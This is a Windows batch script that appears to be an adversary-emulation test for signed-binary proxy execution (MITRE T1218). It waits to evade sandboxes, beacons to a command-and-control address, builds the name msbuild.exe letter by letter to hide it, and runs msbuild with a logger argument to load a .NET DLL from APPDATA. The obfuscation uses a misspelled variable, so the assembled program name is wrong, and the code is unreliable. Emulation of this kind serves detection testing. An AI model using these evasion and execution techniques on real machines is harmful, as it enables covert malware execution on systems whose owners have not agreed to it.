@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET xqvlop=%APPDATA%\8794\5035cf2d
SET sldirfn=https://10.0.0.49
SET hvghxll=https://10.0.0.49/stage/2/icon.png?8794-10
SET pdlddda=ITZEL-S2BO
SET bktskry=10
SET mfmxszt=control.txt
SET ilqzslp=8794
SET zpdpeq=!APPDATA!\!bktskry!\macula-simulations.log

REM Initial sandbox evasion delay
echo [%DATE% %TIME%][DEBUG][!pdlddda!]: initial_delay_start=>> "!zpdpeq!" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!pdlddda!]: initial_delay_complete=>> "!zpdpeq!" 2>nul

REM C2 heartbeat (not obfuscated per requirements)
echo [%DATE% %TIME%][DEBUG][!pdlddda!]: heartbeat_start=>> "!zpdpeq!" 2>nul
curl -k -s -o nul "!hvghxll!"
echo [%DATE% %TIME%][DEBUG][!pdlddda!]: heartbeat_complete=>> "!zpdpeq!" 2>nul

ping -n 8 127.0.0.1 >nul

REM Character-by-character obfuscation of msbuild.exe
echo [%DATE% %TIME%][DEBUG][!pdlddda!]: obfuscation_start=>> "!zpdpeq!" 2>nul
SET opzw=m
SET itcw=s
SET ghlw=b
SET mwwc=u
SET tjlf=i
SET jhfi=l
SET lqxy=d
SET iixff=.exe
SET rkrzxc=!opzw!!itcw!!ghlw!!mwwc!!tjlf!!jhfi!!lqxf!!iixff!

SET xfeq=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\
SET lbhzxd=!xfeq!!rkrzxc!
echo [%DATE% %TIME%][DEBUG][!pdlddda!]: obfuscation_complete=!lbhzxd!>> "!zpdpeq!" 2>nul

CHOICE /C Y /N /D Y /T 12 >nul

REM Execute .NET DLL via msbuild logger
SET /A dlay=%RANDOM% %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!pdlddda!]: random_delay_start=!dlay!>> "!zpdpeq!" 2>nul
timeout /t !dlay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!pdlddda!]: random_delay_complete=>> "!zpdpeq!" 2>nul

SET ttp_result=1
SET ttp_error=
echo [%DATE% %TIME%][DEBUG][!pdlddda!]: execution_start=!xqvlop!\\!mfmxszt!>> "!zpdpeq!" 2>nul

!lbhzxd! /logger:LoggerEntry,!xqvlop!\\!mfmxszt!;MyParameters,Foo
IF NOT !ERRORLEVEL! EQU 0 (
    SET ttp_result=0
    SET ttp_error=execution_failed_!ERRORLEVEL!
)

echo [%DATE% %TIME%][DEBUG][!pdlddda!]: execution_complete=result_!ttp_result!>> "!zpdpeq!" 2>nul

REM TTP logging
echo [%DATE% %TIME%][!pdlddda!]: !bktskry!-!ilqzslp!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!zpdpeq!" 2>nul